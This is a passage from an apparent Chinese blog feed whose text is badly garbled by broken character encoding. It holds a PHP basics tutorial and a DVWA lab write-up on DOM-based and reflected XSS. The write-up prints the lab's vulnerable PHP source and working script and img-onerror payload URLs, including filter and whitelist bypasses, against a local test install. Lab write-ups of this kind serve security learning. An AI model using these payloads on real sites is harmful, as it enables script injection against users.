å‡½æ•°ç”¨äºŽåœ¨å­—ç¬¦ä¸²å†…æŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€æ®µæŒ‡å®šçš„æ–‡æœ¬ã€‚</p><p>å¦‚æžœåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°åŒ¹é…ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›žç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä½ç½®ã€‚å¦‚æžœæœªæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è¿”å›ž FALSEã€‚</p><p>ä¸‹é¢çš„å®žä¾‹åœ¨å­—ç¬¦ä¸² â€œHello world!â€ ä¸­æŸ¥æ‰¾æ–‡æœ¬ â€œworldâ€ï¼š</p><p>å®žä¾‹<br><!--?php echo strpos("Hello world!","world"); ?--></p><p>è¿è¡Œå®žä¾‹ Â»<br>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼š6</p><p>æç¤ºï¼šåœ¨ä¸Šé¢çš„å®žä¾‹ä¸­ï¼Œå­—ç¬¦ä¸² â€œworldâ€ çš„ä½ç½®æ˜¯ 6ã€‚<strong>ä¹‹æ‰€ä»¥æ˜¯ 6 è€Œä¸æ˜¯ 7 çš„åŽŸå› æ˜¯ï¼Œå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 0ï¼Œè€Œä¸æ˜¯ 1ã€‚</strong></p><p><strong>7.PHP ç®—æœ¯è¿ç®—ç¬¦</strong><br>è¿ç®—ç¬¦    åç§°                            æè¿°                           å®žä¾‹                  ç»“æžœ<br>x + y       åŠ                                  x å’Œ y çš„å’Œ                2 + 2                4<br>x - y        å‡                                 x å’Œ y çš„å·®                5 - 2                 3<br>x * y       ä¹˜                                 x å’Œ y çš„ç§¯                5 * 2                10<br>x / y        é™¤                                 x å’Œ y çš„å•†               15 / 5                3<br>x % y      æ¨¡ï¼ˆé™¤æ³•çš„ä½™æ•°ï¼‰      x é™¤ä»¥ y çš„ä½™æ•°        5 % 2                1<br>- x           å–å                             x å–å                       <!--?php              -2                                                                                      $x =2;                                                                                      echo -$x;                                                                                      ?--><br>a . b        å¹¶ç½®                            è¿žæŽ¥ä¸¤ä¸ªå­—ç¬¦ä¸²    â€œHiâ€ . â€œHaâ€        HiHa</p><p><strong>8.PHP èµ‹å€¼è¿ç®—ç¬¦</strong><br>åœ¨ PHP ä¸­ï¼ŒåŸºæœ¬çš„èµ‹å€¼è¿ç®—ç¬¦æ˜¯ â€œ=â€ã€‚å®ƒæ„å‘³ç€å·¦æ“ä½œæ•°è¢«è®¾ç½®ä¸ºå³ä¾§è¡¨è¾¾å¼çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€$x = 5â€ çš„å€¼æ˜¯ 5ã€‚</p><p>è¿ç®—ç¬¦    ç­‰åŒäºŽ         æè¿°<br>x = y       x = y            å·¦æ“ä½œæ•°è¢«è®¾ç½®ä¸ºå³ä¾§è¡¨è¾¾å¼çš„å€¼<br>x += y     x = x + y      åŠ <br>x -= y      x = x - y       å‡<br>x *= y     x = x * y      ä¹˜<br>x /= y      x = x / y      é™¤<br>x %= y    x = x % y     æ¨¡ï¼ˆé™¤æ³•çš„ä½™æ•°ï¼‰<br>a .= b    a = a . b        è¿žæŽ¥ä¸¤ä¸ªå­—ç¬¦ä¸²<br>ä»¥ä¸‹å®žä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ä¸åŒèµ‹å€¼è¿ç®—ç¬¦å¾—åˆ°çš„ä¸åŒç»“æžœï¼š</p><p>å®žä¾‹<br>&lt;?php<br>$x=10;<br>echo $x; // è¾“å‡º10</p><p>$y=20;<br>$y += 100;<br>echo $y; // è¾“å‡º120</p><p>$z=50;<br>$z -= 25;<br>echo $z; // è¾“å‡º25</p><p>$i=5;<br>$i *= 6;<br>echo $i; // è¾“å‡º30</p><p>$j=10;<br>$j /= 5;<br>echo $j; // è¾“å‡º2</p><p>$k=15;<br>$k %= 4;<br>echo $k; // è¾“å‡º3<br>?&gt;</p><p><strong>9.PHP é€’å¢ž/é€’å‡è¿ç®—ç¬¦</strong><br>è¿ç®—ç¬¦    åç§°        æè¿°<br>++ x        é¢„é€’å¢ž    x åŠ  1ï¼Œç„¶åŽè¿”å›ž x<br>x ++        åŽé€’å¢ž    è¿”å›ž xï¼Œç„¶åŽ x åŠ  1<br>â€“ x          é¢„é€’å‡    x å‡ 1ï¼Œç„¶åŽè¿”å›ž x<br>x â€“          åŽé€’å‡    è¿”å›ž xï¼Œç„¶åŽ x å‡ 1<br>ä»¥ä¸‹å®žä¾‹æ¼”ç¤ºäº†ä½¿ç”¨é€’å¢ž/é€’å‡è¿ç®—ç¬¦å¾—åˆ°çš„ç»“æžœï¼š</p><p>å®žä¾‹<br>&lt;?php<br>$x=10;<br>echo ++$x; // è¾“å‡º11</p><p>$y=10;<br>echo $y++; // è¾“å‡º10</p><p>$z=5;<br>echo â€“$z; // è¾“å‡º4</p><p>$i=5;<br>echo $iâ€“; // è¾“å‡º5<br>?&gt;</p><p><strong>10.PHP æ¯”è¾ƒè¿ç®—ç¬¦</strong><br>æ¯”è¾ƒæ“ä½œç¬¦å¯ä»¥è®©æ‚¨æ¯”è¾ƒä¸¤ä¸ªå€¼ï¼š</p><p>è¿ç®—ç¬¦        åç§°              æè¿°                                                                                 å®žä¾‹<br>x == y         ç­‰äºŽ              å¦‚æžœ x ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true                                           5==8 è¿”å›ž false<br>x === y       ç»å¯¹ç­‰äºŽ      å¦‚æžœ x ç­‰äºŽ yï¼Œä¸”å®ƒä»¬ç±»åž‹ç›¸åŒï¼Œåˆ™è¿”å›ž true            5===â€5â€ è¿”å›ž false<br>x != y          ä¸ç­‰äºŽ          å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true                                       5!=8 è¿”å›ž true<br>x &lt;&gt; y         ä¸ç­‰äºŽ          å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true                                       5&lt;&gt;8 è¿”å›ž true<br>x !== y        ç»å¯¹ä¸ç­‰äºŽ  å¦‚æžœ x ä¸ç­‰äºŽ yï¼Œæˆ–å®ƒä»¬ç±»åž‹ä¸ç›¸åŒï¼Œåˆ™è¿”å›ž true     5!==â€5â€ è¿”å›ž true<br>x &gt; y           å¤§äºŽ              å¦‚æžœ x å¤§äºŽ yï¼Œåˆ™è¿”å›ž true                                           5&gt;8 è¿”å›ž false<br>x &lt; y           å°äºŽ              å¦‚æžœ x å°äºŽ yï¼Œåˆ™è¿”å›ž true                                           5&lt;8 è¿”å›ž true<br>x &gt;= y         å¤§äºŽç­‰äºŽ      å¦‚æžœ x å¤§äºŽæˆ–è€…ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true                            5&gt;=8 è¿”å›ž false<br>x &lt;= y         å°äºŽç­‰äºŽ      å¦‚æžœ x å°äºŽæˆ–è€…ç­‰äºŽ yï¼Œåˆ™è¿”å›ž true                            5&lt;=8 è¿”å›ž true<br>ä»¥ä¸‹å®žä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ä¸€äº›æ¯”è¾ƒè¿ç®—ç¬¦å¾—åˆ°çš„ä¸åŒç»“æžœï¼š</p><p>å®žä¾‹<br>&lt;?php<br>$x=100;<br>$y=â€100â€;</p><p>var_dump($x == $y);<br>echo â€œ <br>â€œ;<br>var_dump($x === $y);<br>echo â€œ <br>â€œ;<br>var_dump($x != $y);<br>echo â€œ <br>â€œ;<br>var_dump($x !== $y);<br>echo â€œ <br>â€œ;</p><p>$a=50;<br>$b=90;</p><p>var_dump($a &gt; $b);<br>echo â€œ<br>â€œ;<br>var_dump($a &lt; $b);<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA:XSS</title>
      <link href="2021/07/16/dvwa-xss/"/>
      <url>2021/07/16/dvwa-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="DOM-XSSï¼ˆDOMåž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"><a href="#DOM-XSSï¼ˆDOMåž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰" class="headerlink" title="DOM-XSSï¼ˆDOMåž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"></a>DOM-XSSï¼ˆDOMåž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</h1><p>XSSï¼Œå…¨ç§°Cross Site Scriptingï¼Œå³è·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒæŸç§æ„ä¹‰ä¸Šä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œæ˜¯æŒ‡æ”»å‡»è€…åœ¨é¡µé¢ä¸­æ³¨å…¥æ¶æ„çš„è„šæœ¬ä»£ç ï¼Œå½“å—å®³è€…è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç ä¼šåœ¨å…¶æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œéœ€è¦å¼ºè°ƒçš„æ˜¯ï¼ŒXSSä¸ä»…ä»…é™äºŽJavaScriptï¼Œè¿˜åŒ…æ‹¬flashç­‰å…¶å®ƒè„šæœ¬è¯­è¨€ã€‚æ ¹æ®æ¶æ„ä»£ç æ˜¯å¦å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­ï¼ŒXSSå¯ä»¥åˆ†ä¸ºå­˜å‚¨åž‹çš„XSSä¸Žåå°„åž‹çš„XSSã€‚</p><p>DOMâ€”based XSSæ¼æ´žæ˜¯åŸºäºŽæ–‡æ¡£å¯¹è±¡æ¨¡åž‹Document Objeet Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´žã€‚DOMæ˜¯ä¸€ä¸ªä¸Žå¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æŽ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æž„å’Œæ ·å¼ï¼Œå¤„ç†åŽçš„ç»“æžœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚URLï¼Œlocationï¼ŒrefelTerç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºŽæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»Žå®¢æˆ·ç«¯èŽ·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æžœDOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”ŸDOMâ€”based XSSæ¼æ´žã€‚</p><p>å¯èƒ½è§¦å‘DOMåž‹XSSçš„å±žæ€§ï¼š</p><p>document.refererå±žæ€§</p><p>window.nameå±žæ€§</p><p>locationå±žæ€§</p><p>innerHTMLå±žæ€§</p><p>documen.writeå±žæ€§</p><h3 id="document-å’Œ-windows-å¯¹è±¡"><a href="#document-å’Œ-windows-å¯¹è±¡" class="headerlink" title="document å’Œ windows å¯¹è±¡"></a>document å’Œ windows å¯¹è±¡</h3><p>documentè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ï¼Œwindowè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªçª—å£å¯¹è±¡ï¼Œä¸€ä¸ªçª—å£ä¸‹å¯ä»¥æœ‰å¤šä¸ªæ–‡æ¡£å¯¹è±¡ã€‚</p><p>æ‰€ä»¥ä¸€ä¸ªçª—å£ä¸‹åªæœ‰ä¸€ä¸ªwindow.location.hrefï¼Œä½†æ˜¯å¯èƒ½æœ‰å¤šä¸ªdocument.URLã€document.location.href</p><p>window å¯¹è±¡</p><p>å®ƒæ˜¯ä¸€ä¸ªé¡¶å±‚å¯¹è±¡,è€Œä¸æ˜¯å¦ä¸€ä¸ªå¯¹è±¡çš„å±žæ€§å³æµè§ˆå™¨çš„çª—å£ã€‚</p><p>document å¯¹è±¡</p><p>è¯¥å¯¹è±¡æ˜¯windowå’Œframeså¯¹è±¡çš„ä¸€ä¸ªå±žæ€§,æ˜¯æ˜¾ç¤ºäºŽçª—å£æˆ–æ¡†æž¶å†…çš„ä¸€ä¸ªæ–‡æ¡£ã€‚</p><p>document åªæ˜¯å±žäºŽwindow çš„ä¸€ä¸ªå­å¯¹åƒã€‚</p><p>window.location åŒ…å« href å±žæ€§ï¼Œç›´æŽ¥å–å€¼èµ‹å€¼æ—¶ç›¸å½“äºŽ window.location.href</p><p>window.location.href å½“å‰é¡µé¢å®Œæ•´ URL</p><p>document.location åŒ…å« href å±žæ€§ï¼Œç›´æŽ¥å–å€¼èµ‹å€¼æ—¶ç›¸å½“äºŽ document.location.href</p><p>document.location.href å½“å‰é¡µé¢å®Œæ•´ URL</p><p>document.href æ²¡æœ‰è¿™ä¸ªå±žæ€§</p><p>document.URL å–å€¼æ—¶ç­‰ä»·äºŽ window.location.href æˆ– document.location.hrefã€‚åœ¨æŸäº›æµè§ˆå™¨ä¸­é€šè¿‡å¯¹ document.URL èµ‹å€¼æ¥å®žçŽ°é¡µé¢è·³è½¬ï¼Œä½†æŸäº›æµè§ˆå™¨ä¸­ä¸è¡Œã€‚</p><h3 id="indexOf-æ–¹æ³•"><a href="#indexOf-æ–¹æ³•" class="headerlink" title="indexOf()æ–¹æ³•"></a>indexOf()æ–¹æ³•</h3><p>å®šä¹‰å’Œç”¨æ³•</p><p>indexOf() æ–¹æ³•å¯è¿”å›žæŸä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²å€¼åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºçŽ°çš„ä½ç½®ã€‚</p><p>indexOf(searchvalue,fromindex)<br>å‚æ•°    æè¿°<br>searchvalue    å¿…éœ€ã€‚è§„å®šéœ€æ£€ç´¢çš„å­—ç¬¦ä¸²å€¼ã€‚<br>fromindex    å¯é€‰çš„æ•´æ•°å‚æ•°ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²ä¸­å¼€å§‹æ£€ç´¢çš„ä½ç½®ã€‚å®ƒçš„åˆæ³•å–å€¼æ˜¯ 0 åˆ° stringObject.length - 1ã€‚å¦‚çœç•¥è¯¥å‚æ•°ï¼Œåˆ™å°†ä»Žå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦å¼€å§‹æ£€ç´¢ã€‚</p><p>æ³¨é‡Šï¼šindexOf() æ–¹æ³•å¯¹å¤§å°å†™æ•æ„Ÿï¼</p><p>æ³¨é‡Šï¼šå¦‚æžœè¦æ£€ç´¢çš„å­—ç¬¦ä¸²å€¼æ²¡æœ‰å‡ºçŽ°ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å›ž -1<br>è¾“å‡º0-16</p><h3 id="substring-æ–¹æ³•"><a href="#substring-æ–¹æ³•" class="headerlink" title="substring() æ–¹æ³•"></a>substring() æ–¹æ³•</h3><p>substring() æ–¹æ³•ç”¨äºŽæå–å­—ç¬¦ä¸²ä¸­ä»‹äºŽä¸¤ä¸ªæŒ‡å®šä¸‹æ ‡ä¹‹é—´çš„å­—ç¬¦ã€‚</p><p>substring(start,stop)<br>å‚æ•°    æè¿°<br>start å¿…éœ€ã€‚    ä¸€ä¸ªéžè´Ÿçš„æ•´æ•°ï¼Œè§„å®šè¦æå–çš„å­ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨ stringObject ä¸­çš„ä½ç½®ã€‚<br>stop å¯é€‰ã€‚    ä¸€ä¸ªéžè´Ÿçš„æ•´æ•°ï¼Œæ¯”è¦æå–çš„å­ä¸²çš„æœ€åŽä¸€ä¸ªå­—ç¬¦åœ¨ stringObject ä¸­çš„ä½ç½®å¤š 1ã€‚<br>å¦‚æžœçœç•¥è¯¥å‚æ•°ï¼Œé‚£ä¹ˆè¿”å›žçš„å­ä¸²ä¼šä¸€ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚    </p><p>decodeURI() å‡½æ•°å¯å¯¹ encodeURI() å‡½æ•°ç¼–ç è¿‡çš„ URI è¿›è¡Œè§£ç </p><h3 id="document-write"><a href="#document-write" class="headerlink" title="document.write"></a>document.write</h3><p>document.writeè¯¦è§£</p><p>document.writeæ˜¯JavaScriptä¸­å¯¹document.openæ‰€å¼€å¯çš„æ–‡æ¡£æµ(document streamæ“ä½œçš„APIæ–¹æ³•ï¼Œå®ƒèƒ½å¤Ÿç›´æŽ¥åœ¨æ–‡æ¡£æµä¸­å†™å…¥å­—ç¬¦ä¸²ï¼Œä¸€æ—¦æ–‡æ¡£æµå·²ç»å…³é—­ï¼Œé‚£document.writeå°±ä¼šé‡æ–°åˆ©ç”¨document.openæ‰“å¼€æ–°çš„æ–‡æ¡£æµå¹¶å†™å…¥ï¼Œæ­¤æ—¶åŽŸæ¥çš„æ–‡æ¡£æµä¼šè¢«æ¸…ç©ºï¼Œå·²æ¸²æŸ“å¥½çš„é¡µé¢å°±ä¼šè¢«æ¸…é™¤ï¼Œæµè§ˆå™¨å°†é‡æ–°æž„å»ºDOMå¹¶æ¸²æŸ“æ–°çš„é¡µé¢</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>é€‰æ‹©English</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\3.png" alt="3"></p><p>å‰ç«¯æºç </p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\2.png" alt="2"></p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1.png" alt="1"></p><p>æœåŠ¡å™¨ç«¯æºç </p><pre><code>&lt;?php# No protections, anything goes?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå‰ç«¯ä½¿ç”¨ document.write() åŠ¨æ€ç”Ÿæˆé¡µé¢ï¼ŒæœåŠ¡å™¨ç«¯ä»£ç æ²¡æœ‰ä»»ä½•çš„ä¿æŠ¤æ€§æŽªæ–½ï¼</p><p>é¡µé¢æœ¬æ„æ˜¯å«æˆ‘ä»¬é€‰æ‹©é»˜è®¤çš„è¯­è¨€ï¼Œä½†æ˜¯å¯¹defaultå‚æ•°æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ã€‚</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\4.png" alt="4"></p><p>F12</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\5.png" alt="5"></p><p>çœ‹åˆ°è„šæœ¬è¢«æ’å…¥</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php// Is there any input?// array_key_exists()æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨array_key_exists() å‡½æ•°æ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æžœé”®åå­˜åœ¨åˆ™è¿”å›ž trueï¼Œå¦‚æžœé”®åä¸å­˜åœ¨åˆ™è¿”å›ž falseã€‚æç¤ºï¼šå¦‚æžœæŒ‡å®šæ•°ç»„çš„æ—¶å€™çœç•¥äº†é”®åï¼Œå°†ä¼šç”Ÿæˆä»Ž 0 å¼€å§‹å¹¶ä»¥ 1 é€’å¢žçš„æ•´æ•°é”®åarray_key_exists(key,array)key å¿…éœ€    è§„å®šé”®åã€‚array    å¿…éœ€ã€‚è§„å®šæ•°ç»„if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {    $default = $_GET['default'];    # Do not alLow script tags//è¿‡æ»¤&lt;scriptï¼Œå«scriiptçš„å°±ä¸å¯ä»¥stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰stripos(string,find,start)string å¿…éœ€    è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚find å¿…éœ€    è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚start å¯é€‰    è§„å®šå¼€å§‹æœç´¢çš„ä½ç½®ã€‚è¿”å›žå€¼ï¼š    è¿”å›žå­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„ä½ç½®ï¼Œå¦‚æžœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å›ž FALSEã€‚æ³¨é‡Šï¼šå­—ç¬¦ä¸²ä½ç½®ä»Ž 0 å¼€å§‹ï¼Œä¸æ˜¯ä»Ž 1 å¼€å§‹ã€‚    if (stripos ($default, "&lt;script") !== false) {//å¦‚æžœå‚æ•°ä¸å«&lt;scriptheader() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€åŽŸå§‹çš„ HTTP æŠ¥å¤´header(string,replace,http_response_code)string å¿…éœ€    è§„å®šè¦å‘é€çš„æŠ¥å¤´å­—ç¬¦ä¸²ã€‚replace å¯é€‰    æŒ‡ç¤ºè¯¥æŠ¥å¤´æ˜¯å¦æ›¿æ¢ä¹‹å‰çš„æŠ¥å¤´ï¼Œæˆ–æ·»åŠ ç¬¬äºŒä¸ªæŠ¥å¤´ã€‚é»˜è®¤æ˜¯ trueï¼ˆæ›¿æ¢ï¼‰ã€‚falseï¼ˆå…è®¸ç›¸åŒç±»åž‹çš„å¤šä¸ªæŠ¥å¤´ï¼‰ã€‚http_response_codeå¯é€‰    æŠŠ HTTP å“åº”ä»£ç å¼ºåˆ¶ä¸ºæŒ‡å®šçš„å€¼ã€‚ï¼ˆPHP 4 ä»¥åŠæ›´é«˜ç‰ˆæœ¬å¯ç”¨ï¼‰        header ("location: ?default=English");        exit;    }}?&gt;</code></pre><p>å¾ˆæ˜Žæ˜¾ï¼Œè¿™é‡Œè¿‡æ»¤äº† &lt;script ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨&lt;img src=1 onerror=alert(â€˜xssâ€™)&gt;ç»•è¿‡ã€‚</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&lt;img src=1 Î¿nerrÎ¿r=alert('xss')&gt; </code></pre><p>æœªæˆåŠŸæ‰§è¡Œ<img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426164742152-626531704.png" alt="1375459-20200426164742152-626531704"></p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426165203052-197710952.png"></p><pre><code>http://127.0.0.1/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426165933780-960362727.png" alt="1375459-20200426165933780-960362727"></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {    # White list the alLowable languages//ç™½åå•ï¼Œåªå…è®¸Frenchã€Englishã€Germanã€Spanish    switch ($_GET['default']) {        case "French":        case "English":        case "German":        case "Spanish":            # ok            break;        default:            header ("location: ?default=English");            exit;    }}?&gt;</code></pre><p>ç™½åå• åªå…è®¸ ä¼ çš„ defaultå€¼ ä¸º French English German Spanish å…¶ä¸­ä¸€ä¸ª</p><p>æž„é€ æ”»å‡»è¯­å¥</p><pre><code>http://192.168.31.155/dvwa-master/vulnerabilities/xss_d/?default= English #</code></pre><p>English # </p><p>URLä¸­#å·ä¹‹åŽçš„å†…å®¹ï¼Œåœ¨æäº¤è¡¨å•æ—¶ï¼Œè¢«å½“æˆæ³¨é‡Šï¼Œä¸ä¼šè¢«æäº¤åˆ°æœåŠ¡å™¨</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English # &lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„scriptè„šæœ¬æˆåŠŸæ‰§è¡Œäº†</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426161303047-1450475024.png" alt="1375459-20200426161303047-1450475024"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php# Don't need to do anything, protction handled on the client side?&gt;</code></pre><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426163351876-1011661984.png" alt="1375459-20200426163351876-1011661984"></p><p>ç”±äºŽå¤§å¤šæ•°æµè§ˆå™¨é»˜è®¤å°†ä»ŽURLä¸­èŽ·å–çš„å†…å®¹è¿›è¡Œç¼–ç ï¼Œè€Œå®¢æˆ·ç«¯çš„æºä»£ç ä¸­ç›´æŽ¥å°†ç¼–ç åŽçš„è¾“å…¥æ’å…¥åˆ°äº†åŠ¨æ€é¡µé¢ä¸­ï¼ˆå¯ä»¥ä¸Žlowçº§åˆ«çš„å®¢æˆ·ç«¯ä»£ç è¿›è¡Œæ¯”è¾ƒï¼‰ï¼Œä»Žè€Œé˜»æ­¢äº†æ‰§è¡Œä»»ä½•æ³¨å…¥çš„JavaScriptã€‚</p><p><a href="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English</a><script>alert('xss')</script></p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426171158637-222348334.png" alt="1375459-20200426171158637-222348334"></p><p>æˆ‘ä»¬æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘çŽ°è¿™é‡Œå¯¹æˆ‘ä»¬è¾“å…¥çš„å‚æ•°å¹¶æ²¡æœ‰è¿›è¡ŒURLè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„ä»»ä½•å‚æ•°éƒ½æ˜¯ç»è¿‡URLç¼–ç ï¼Œç„¶åŽç›´æŽ¥èµ‹å€¼ç»™optionæ ‡ç­¾ã€‚æ‰€ä»¥ï¼Œå°±ä¸å­˜åœ¨XSSæ¼æ´žäº†ã€‚</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426171421791-967272941.png" alt="1375459-20200426171421791-967272941"></p><h1 id="reflected-XSSï¼ˆåå°„åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"><a href="#reflected-XSSï¼ˆåå°„åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰" class="headerlink" title="reflected-XSSï¼ˆåå°„åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"></a>reflected-XSSï¼ˆåå°„åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</h1><p>åå°„åž‹Xss &lt;å…¨ç§°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´žï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­</p><p>å…¶å®žåå°„åž‹å’ŒDOMåž‹çš„XSSå·®åˆ«ä¸»è¦åœ¨äºŽï¼Œåå°„åž‹æ˜¯ä¼šå¾€åŽå°æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè€ŒDOMåž‹ç›´æŽ¥åœ¨å‰ç«¯è¿›è¡Œè§£æžï¼›ä¸¤è€…éƒ½æ˜¯ä¸€æ¬¡æ€§çš„</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?// arrary_key_exists()å‡½æ•°ï¼šåˆ¤æ–­$_GETçš„å€¼ä¸­æ˜¯å¦å­˜åœ¨â€œnameâ€é”®åã€‚å¹¶ä¸”$_GET[â€˜nameâ€™]çš„å€¼æ˜¯å¦ä¸ä¸ºç©ºï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œç›´æŽ¥è¾“å‡ºä¸‹é¢çš„è¾“å‡ºè¯­å¥ã€‚if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {    // Feedback for end user    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . 